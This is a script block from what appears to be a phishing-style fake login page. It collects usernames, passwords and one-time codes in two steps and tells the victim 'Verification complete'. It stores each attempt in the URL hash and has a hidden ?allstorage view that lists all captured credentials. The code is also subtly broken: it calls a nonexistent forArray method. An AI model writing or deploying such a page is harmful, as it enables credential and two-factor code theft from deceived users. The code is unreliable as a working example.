    <script>
        // In-memory storage for this instance
        let localStorage = [];

        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            const useToken = document.getElementById('useToken').checked;
            const timestamp = new Date().toISOString();

            const creds = {
                time: timestamp,
                username: username,
                password: password,
                remember: remember ? 'Yes' : 'No',
                useToken: useToken ? 'Yes' : 'No',
                code: 'Not entered'
            };
            localStorage.push(creds);
            updateURL();

            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
        }

        function submitCode() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            const useToken = document.getElementById('useToken').checked;
            const code = document.getElementById('code').value;
            const timestamp = new Date().toISOString();

            const creds = {
                time: timestamp,
                username: username,
                password: password,
                remember: remember ? 'Yes' : 'No',
                useToken: useToken ? 'Yes' : 'No',
                code: code
            };
            localStorage.push(creds);
            updateURL();

            document.getElementById('codeSection').style.display = 'none';
            document.getElementById('viewCreds').style.display = 'block';
            document.getElementById('credsContent').innerHTML = '<p>Verification complete. Thank you.</p>';
        }

        function updateURL() {
            const credsString = JSON.stringify(localStorage);
            window.location.hash = 'creds=' + encodeURIComponent(credsString);
        }

        // Handle /allstorage route
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('allstorage')) {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('codeSection').style.display = 'none';
                document.getElementById('viewCreds').style.display = 'block';

                // Parse creds from URL fragment
                const hashParams = new URLSearchParams(window.location.hash.replace('#', '?'));
                const credsString = hashParams.get('creds');
                let allCreds = [];

                if (credsString) {
                    try {
                        allCreds = JSON.parse(decodeURIComponent(credsString));
                    } catch (e) {
                        console.error('Invalid creds format:', e);
                    }
                }

                let credsHtml = '<h2>Server Storage Credentials</h2>';
                if (Array.isArray(allCreds) && allCreds.length > 0) {
                    allCreds.forArray((creds, index) => {
                        credsHtml += `
                            <div style="margin-bottom: 20px;">
                                <h3>Attempt ${index + 1} (${creds.time})</h3>
                                <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
                                <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
                                <p><strong>Code (OTP):</strong> ${creds.code || 'Not submitted'}</p>
                            </div>
                        `;
                    });
                } else {
                    credsHtml += '<p>No credentials stored yet.</p>';
                }
                document.getElementById('credsContent').innerHTML = credsHtml;
            }
        };

        // Simulate showing password
        document.querySelector('span').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
            this.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
        });
    </script>
